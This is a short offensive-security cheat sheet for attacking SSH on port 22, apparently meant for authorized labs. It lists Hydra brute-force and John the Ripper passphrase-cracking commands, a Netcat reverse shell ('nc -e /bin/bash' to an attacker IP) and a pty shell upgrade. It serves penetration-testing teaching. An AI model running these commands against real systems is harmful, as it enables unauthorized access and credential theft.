# SSH – Port 22

**Port:** 22/TCP  
**Service:** Secure Shell (SSH)

### 1. Initial SSH Login

If port 22 is open, try connecting to the SSH service.

Two common authentication methods:
- Username and Password
- SSH Private Key (RSA)

`ssh username@<IP>` : Connect to the SSH server.

### 2. Brute Force (Hydra)

If credentials are unknown, test username and password combinations (authorized labs only).

`hydra -L /path/user.txt -P /path/pass.txt -t 4 ssh://<IP>`

- `-L` → Username wordlist.
- `-P` → Password wordlist.
- `-t 4` → 4 parallel tasks.

### 3. Login with SSH Private Key

If an SSH private key (`id_rsa`) is discovered, save its complete contents into a file.

`chmod 600 ssh_key` : Set secure permissions for the private key.

`ssh -i ssh_key username@<IP>` : Connect using the private key.

### 4. Crack SSH Private Key Passphrase

If the private key is encrypted, extract its hash using ssh2john.

`ssh2john id_rsa > ssh.hash`

`john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt`

`john ssh.hash --show` : Display recovered passwords.

### 5. Reverse Shell (If Applicable)

A reverse shell requires an appropriate execution vulnerability or authorized access on the target.

On Kali, listen for an incoming connection:

`nc -lvnp 4444`

A compatible target-side Netcat may initiate a connection using:

`nc -e /bin/bash <YOUR_IP> 4444`

### 6. Upgrade to Interactive Shell

Check Python availability:

`which python` or `which python3`

If Python 3 is available:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

This upgrades a basic shell to a more interactive Bash shell.

**Note:** Port 22 being open does not guarantee SSH login access. Valid credentials or an authorized private key are required. LFI and directory traversal may expose private keys, but these are vulnerabilities that can lead to key discovery, not SSH authentication methods themselves.
